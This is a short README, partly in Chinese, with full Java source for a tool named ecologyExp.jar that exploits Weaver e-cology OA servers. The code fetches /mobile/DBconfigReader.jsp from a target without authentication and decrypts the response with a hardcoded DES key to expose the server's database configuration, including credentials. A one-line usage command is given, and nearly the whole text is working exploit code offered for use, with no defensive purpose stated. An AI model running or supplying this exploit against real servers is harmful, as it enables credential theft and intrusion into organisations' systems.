# ecologyExp.jar
泛微oa数据库配置文件读取
java -jar ecologyExp.jar http://127.0.0.1

源码
package com.test;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.security.SecureRandom;

public class ReadDbConfig {
    private final static String DES = "DES";
    private final static String key = "1z2x3c4v5b6n";

    public static void main(String[] args) throws Exception {
        if(args[0]!=null&& args[0].length() !=0){
            String url = args[0]+"/mobile/DBconfigReader.jsp";
            System.out.println(ReadConfig(url));
        }else{
            System.err.print("use: java -jar ecologyExp  http://127.0.0.1");
        }
    }
    
    private static String ReadConfig(String url) throws Exception {
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
        HttpGet httpGet = new HttpGet(url);
        CloseableHttpResponse response = httpClient.execute(httpGet);
        HttpEntity responseEntity = response.getEntity();
    
        byte[] res1 = EntityUtils.toByteArray(responseEntity);
    
        byte[] data = subBytes(res1,10,res1.length-10);
    
        byte [] finaldata =decrypt(data,key.getBytes());
    
        return (new String(finaldata));
    }
    
    private static byte[] decrypt(byte[] data, byte[] key) throws Exception {
    
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance(DES);
        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
    
        return cipher.doFinal(data);
    }
    
    public static byte[] subBytes(byte[] src, int begin, int count) {
        byte[] bs = new byte[count];
        System.arraycopy(src, begin, bs, 0, count);
        return bs;
    }

}

源： https://github.com/ianxtianxt/ecologyExp.jar 

